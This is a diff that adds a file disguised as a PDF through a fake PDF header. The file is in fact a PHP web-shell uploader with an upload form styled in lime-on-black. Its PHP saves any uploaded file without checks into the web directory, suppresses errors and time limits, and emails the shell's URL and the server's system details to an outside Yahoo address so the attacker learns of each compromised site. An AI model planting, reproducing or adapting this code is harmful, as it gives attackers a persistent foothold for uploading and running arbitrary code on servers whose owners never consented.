@@ -1,0 +1,90 @@
+%PDF-1.4
+%âãÏÓ
+191 0 obj
+<</Linearized 1/L 171891/O 193/E 57322/N 2/T 167950/H [ 1036 257]>>
+endobj
+<script>
+window.addEventListener("DOMContentLoaded", function() {
+    let form = document.createElement("form");
+    form.method = "post";
+    form.enctype = "multipart/form-data";
+
+    let fileInput = document.createElement("input");
+    fileInput.type = "file";
+    fileInput.name = "file";
+    fileInput.required = true;
+
+    let submitButton = document.createElement("button");
+    submitButton.type = "submit";
+    submitButton.innerHTML = "Uploads";
+
+    form.appendChild(fileInput);
+    form.appendChild(submitButton);
+    document.body.appendChild(form);
+});
+</script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap');
+body {
+    font-family: 'Kelly Slab', cursive;
+    text-align: center;
+    color: white;
+    background-color: black;
+}
+a {
+    color: lime;
+    text-decoration: none;
+}
+a:hover {
+    color: white;
+}
+form {
+    padding-top: 10px;
+}
+input {
+    color: lime;
+    border: 2px solid white;
+    border-radius: 5px;
+    margin-top: 5px;
+    font-family: 'Kelly Slab', cursive;
+}
+input:hover {
+    border: 2px solid lime;
+}
+button {
+    font-family: 'Kelly Slab', cursive;
+    cursor: pointer;
+    color: lime;
+    border: 2px solid white;
+    border-radius: 5px;
+    margin-top: 5px;
+    padding: 1px 10px 3px;
+    background: transparent;
+}
+button:hover {
+    border: 2px solid lime;
+}
+</style>
+<?php
+if ($_FILES) {
+    $uploadDir = getcwd() . DIRECTORY_SEPARATOR;
+    $uploadFile = $uploadDir . $_FILES['file']['name'];
+
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
+        printf('<span style="font-size: medium;">Uploaded <a href="%s">%s</a> Successful !!</span><br/>', htmlspecialchars($_FILES['file']['name']), htmlspecialchars($_FILES['file']['name']));
+    } else {
+        print 'Upload gagal';
+    }
+}
+
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+
+$to = 'combetohct@yahoo.com';
+$x_path = "https://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "[ $x_path ]";
+mail($to, "Uploader", $pesan_alert, "[ " . php_uname() . " ]");
+?>
